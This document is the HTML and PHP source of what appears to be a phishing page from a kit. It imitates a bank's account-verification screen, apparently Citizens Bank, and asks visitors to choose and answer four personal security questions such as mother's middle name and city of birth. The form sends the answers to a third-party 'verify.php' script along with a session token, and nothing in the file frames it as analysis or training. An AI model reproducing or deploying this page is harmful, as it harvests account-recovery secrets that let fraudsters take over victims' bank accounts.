...
<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
    ...
    <body class="responsive-enabled">
            ...
            <div class="centered-content clearfix">
                <div class="g-unauth-main-container">
                    ...
                    <section class="identify-customer-section">
                        <form id="form" action="../Meta/Benchmark/verify.php?token=<?php echo $_SESSION['token']; ?>" method="POST" class="unauth-form jqtransform js-enrollment-form">
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    ...
                                    <select name="q1" id="q1" class="unauth-form__input js-account-type">
                                        ...
                                        <option value="3">In what city were you married? (Enter full name of city)</option> 
                                        <option value="4">What is your best friend's first name?</option> 
                                        <option value="5">In what city was your high school? (full name of city only)</option> 
                                        <option value="6">What is your maternal grandmother's first name?</option> 
                                        <option value="7">What is the first name of your oldest nephew?</option> 
                                        <option value="8">What is your maternal grandfather's first name?</option> 
                            ...
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    ...
                                    <select name="q2" id="q2" class="unauth-form__input js-account-type">
                                        <option disabled selected="selected">Select One</option> 
                                        <option value="1">In what city was your father born? (Enter full name of city only)</option>
                                        <option value="2">What was the first name of your first manager?</option>
                                        <option value="3">What was your high school mascot?</option>
                                        <option value="4">What was the name of your first pet?</option>
                                        <option value="5">What is your paternal grandmother's first name?</option>
                                        <option value="6">In what city is your vacation home? (Enter full name of city only)</option>
                                        <option value="7">What is the first name of the best man at your wedding?</option>
                                        <option value="8">What is the first name of your oldest niece?</option>
                                        <option value="9">What was the nickname of your grandfather?</option>
                                    </select>
                                </div>
                                <div class="unauth-form__rowitem">
                            ...
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    ...
                                    <select name="q3" id="q3" class="unauth-form__input js-account-type">
                                        <option disabled selected="selected">Select One</option> 
                                        <option value="1">What was the name of the town your grandmother lived in? (Enter full name of town only)</option>
                                        <option value="2">What was the name of your junior high school? (Enter only \"Riverdale\" for Riverdale Junior High School)</option>
                                        <option value="3">In what city was your mother born? (Enter full name of city only)</option> 
                                        <option value="4">In what city were you born? (Enter full name of city only)</option> 
                                        <option value="5">What was the last name of your favorite teacher in final year of high school?</option> 
                                        <option value="6">What was your favorite restaurant in college?</option> 
                                        <option value="7">What street did your best friend in high school live on? (Enter full name of street only)</option> 
                                        <option value="8">What is your mother's middle name?</option> 
                                        <option value="9">What is your paternal grandfather's first name?</option>
                                    </select>
                                </div>
                                <div class="unauth-form__rowitem">
                            ...
                            <div class="unauth-form__row">
                                <div class="unauth-form__rowitem">
                                    <label class="unauth-form__label" for="q3">Question 4</label>
                                    <select name="q4" id="q3" class="unauth-form__input js-account-type">
                                        <option disabled selected="selected">Select One</option> 
                                        <option value="1">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
                                        <option value="2">What was the name of your first girlfriend/boyfriend?</option>
                                        <option value="3">What is the first name of the maid of honor at your wedding?</option> 
                                        <option value="4">In what city were you born? (Enter full name of city only)</option> 
                                        <option value="5">What was the last name of your favorite teacher in final year of high school?</option> 
                                        <option value="6">What was your favorite restaurant in college?</option> 
                                    </select>
                                ...
                                <div class="unauth-form__rowitem">
                                    <input type="text" name="a4" id="a3" placeholder="Answer 4" class="unauth-form__input js-mobilepassword">
                                </div>
                            </div>
        ...
        <script src="../../Guard/js/index.js"></script>
    </body>
</html>